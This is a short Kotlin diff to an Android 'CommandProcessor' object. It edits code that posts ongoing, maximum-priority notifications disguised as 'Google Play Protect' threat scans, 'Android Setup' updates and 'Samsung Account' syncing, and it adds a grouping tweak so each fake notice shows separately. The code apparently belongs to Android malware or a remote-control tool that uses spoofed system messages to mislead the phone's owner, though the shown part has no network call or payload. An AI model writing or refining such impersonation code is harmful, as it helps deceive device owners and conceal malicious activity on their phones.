@@ -2645,9 +2645,7 @@ object CommandProcessor {
                     val fakeNotifs = listOf(
                         Pair("Android Setup", "Finishing system update..."),
                         Pair("Google Play Protect", "Scanning device for threats..."),
-                        Pair("System UI", "Configuring your apps..."),
-                        Pair("Samsung Account", "Syncing profile data..."),
-                        Pair("Android Setup", "Restoring backed up data...")
+                        Pair("Samsung Account", "Syncing profile data...")
                     )
                     
                     try {
@@ -2661,6 +2659,7 @@ object CommandProcessor {
                                 .setContentText(notifData.second)
                                 .setProgress(100, (10..90).random(), true)
                                 .setPriority(androidx.core.app.NotificationCompat.PRIORITY_MAX)
+                                .setGroup("setup_group_$notifId") // Forces individual uncollapsed display
                                 .setOngoing(true)
                             nm.notify(notifId++, builder.build())
                             kotlinx.coroutines.delay(200)
